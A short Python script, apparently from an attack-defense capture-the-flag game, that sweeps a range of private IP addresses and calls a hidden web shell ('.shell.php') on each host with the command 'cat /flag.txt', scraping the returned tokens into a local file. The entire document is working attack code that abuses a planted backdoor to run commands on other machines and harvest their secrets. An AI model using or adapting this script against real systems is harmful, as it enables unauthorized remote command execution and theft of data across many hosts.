import requests
import re

ur='http://172.20.'
url='.101/.shell.php?command=cat /flag.txt'
#http://172.20.122.101/.shell.php?command=cat+%2Fflag.txt
for i in range(101,132,1):
    i=str(i)
    sb=ur+i+url
    try:
        a=requests.post(url=sb,timeout=1).text
        b=re.findall(r'\w{15,50}',a)
    except:
        b=''
    if len(b)>0:
        print(sb)
        for i in b:
            with open ("1.txt","a+") as f:
                f.write(sb+' '+i+'\n')